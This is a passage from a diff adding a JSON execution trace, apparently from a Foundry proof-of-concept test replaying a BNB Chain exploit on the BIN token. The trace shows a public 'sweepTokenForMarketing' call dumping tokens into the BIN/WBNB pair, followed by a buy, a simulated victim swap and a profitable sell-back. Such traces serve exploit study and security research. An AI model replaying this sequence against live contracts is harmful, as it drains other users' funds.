+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "40652882184550549714540985 [4.065e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1292784536275305994 [1.292e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1292784536275305994 [1.292e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "51391110683642631519 [5.139e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "40652882184550549714540985 [4.065e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1292784536275305994 [1.292e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1292784536275305994 [1.292e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "1048305953898063254994587 [1.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "51391110683642631519 [5.139e19], 40652882184550549714540985 [4.065e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "41652882184550549714540985 [4.165e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1230784214170991796 [1.23e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1230784214170991796 [1.23e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "50160326469471639723 [5.016e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "41652882184550549714540985 [4.165e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1230784214170991796 [1.23e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1230784214170991796 [1.23e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "48305953898063254994587 [4.83e22]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "534",
+        "contract": "WBNB",
+        "function": "balanceOf",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "flag": 1,
+        "return_value": "1000000000000000000 [1e18]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "56138",
+        "contract": "Router",
+        "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+        "args": "1000000000000000000 [1e18], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe56842Ed550Ff2794F010738554db45E60730371], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1710126485 [1.71e9]",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "3425",
+            "contract": "WBNB",
+            "function": "transferFrom",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000 [1e18]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "2532",
+            "contract": "BIN",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "893",
+            "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "function": "getReserves",
+            "args": "",
+            "return_value": "50160326469471639723 [5.016e19], 41652882184550549714540985 [4.165e25], 1710126485 [1.71e9]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "flag": 1,
+            "return_value": "51160326469471639723 [5.116e19]",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "41080",
+            "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "function": "swap",
+            "args": "0, 812168007252679721862647 [8.121e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "25986",
+                "contract": "BIN",
+                "function": "transfer",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 812168007252679721862647 [8.121e23]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "51160326469471639723 [5.116e19]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "40840714177297869992678338 [4.084e25]",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "532",
+            "contract": "BIN",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "812168007252679721862647 [8.121e23]",
+            "depth": 2,
+            "internal_calls": []
+          }
+        ],
+        "value": null
+      },
+      {
+        "id": "0",
+        "contract": "VM",
+        "function": "startPrank",
+        "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [],
+        "value": null
+      },
+      {
+        "id": "24420",
+        "contract": "WBNB",
+        "function": "approve",
+        "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "flag": 1,
+        "return_value": "true",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "534",
+        "contract": "WBNB",
+        "function": "balanceOf",
+        "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+        "flag": 1,
+        "return_value": "10000000000000000000 [1e19]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "54138",
+        "contract": "Router",
+        "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+        "args": "10000000000000000000 [1e19], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe56842Ed550Ff2794F010738554db45E60730371], 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 1710126485 [1.71e9]",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "3425",
+            "contract": "WBNB",
+            "function": "transferFrom",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 10000000000000000000 [1e19]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "2532",
+            "contract": "BIN",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "893",
+            "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "function": "getReserves",
+            "args": "",
+            "return_value": "51160326469471639723 [5.116e19], 40840714177297869992678338 [4.084e25], 1710126485 [1.71e9]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "flag": 1,
+            "return_value": "61160326469471639723 [6.116e19]",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "39080",
+            "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "function": "swap",
+            "args": "0, 6663677900239518846527487 [6.663e24], 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 0x",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "23986",
+                "contract": "BIN",
+                "function": "transfer",
+                "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 6663677900239518846527487 [6.663e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "61160326469471639723 [6.116e19]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "34177036277058351146150851 [3.417e25]",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "532",
+            "contract": "BIN",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "6663677900239518846527487 [6.663e24]",
+            "depth": 2,
+            "internal_calls": []
+          }
+        ],
+        "value": null
+      },
+      {
+        "id": "0",
+        "contract": "VM",
+        "function": "stopPrank",
+        "args": "",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [],
+        "value": null
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "flag": 1,
+        "return_value": "812168007252679721862647 [8.121e23]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "57855",
+        "contract": "Router",
+        "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+        "args": "812168007252679721862647 [8.121e23], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1710126485 [1.71e9]",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "9914",
+            "contract": "BIN",
+            "function": "transferFrom",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 812168007252679721862647 [8.121e23]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "893",
+            "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "function": "getReserves",
+            "args": "",
+            "return_value": "61160326469471639723 [6.116e19], 34177036277058351146150851 [3.417e25], 1710126485 [1.71e9]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "532",
+            "contract": "BIN",
+            "function": "balanceOf",
+            "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "flag": 1,
+            "return_value": "34867379083223128909734101 [3.486e25]",
+            "depth": 2,
+            "internal_calls": []
+          },
+          {
+            "id": "38256",
+            "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+            "function": "swap",
+            "args": "1207952053820379849 [1.207e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "23162",
+                "contract": "WBNB",
+                "function": "transfer",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1207952053820379849 [1.207e18]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "59952374415651259874 [5.995e19]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "34867379083223128909734101 [3.486e25]",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "1207952053820379849 [1.207e18]",
+            "depth": 2,
+            "internal_calls": []
+          }
+        ],
+        "value": null
+      },
+      {
+        "id": "534",
+        "contract": "WBNB",
+        "function": "balanceOf",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "flag": 1,
+        "return_value": "1207952053820379849 [1.207e18]",
+        "depth": 1,
+        "internal_calls": []
+      }
+    ]
+  }
+}
